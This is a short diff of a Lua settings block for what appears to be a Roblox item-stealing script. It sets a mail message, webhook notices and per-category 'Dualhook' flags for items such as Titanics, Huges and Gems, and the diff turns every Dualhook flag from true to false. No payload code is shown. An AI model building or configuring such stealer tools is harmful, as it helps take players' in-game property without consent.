@@ -4,39 +4,39 @@ getgenv().Settings = {
     -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
     MailMessage = "Monzz Better",
   Titanics = {
-       Dualhook = true,
+       Dualhook = false,
        Intensity = 100--%
   },
   Banana = {
-       Dualhook = true,
+       Dualhook = false,
        Intensity = 100--%
   },
   Huges = {
-       Dualhook = true,
+       Dualhook = false,
        Intensity = 100--%
   },
   Pogs = {
-       Dualhook = true,
+       Dualhook = false,
        Intensity = 100--%
   },
    Exclusives = {
-       Dualhook = true,
+       Dualhook = false,
        Intensity = 100--%
   },
    Events = {
-       Dualhook = true,
+       Dualhook = false,
        Intensity = 100--%
   },
    Secrets = {
-       Dualhook = true,
+       Dualhook = false,
        Intensity = 100--%
    },
    HC_DM_Mythics = {
-       Dualhook = true,
+       Dualhook = false,
        Intensity = 100--%
    },
    Gems = {
-       Dualhook = true,
+       Dualhook = false,
        Intensity = 100--%
   }
 }
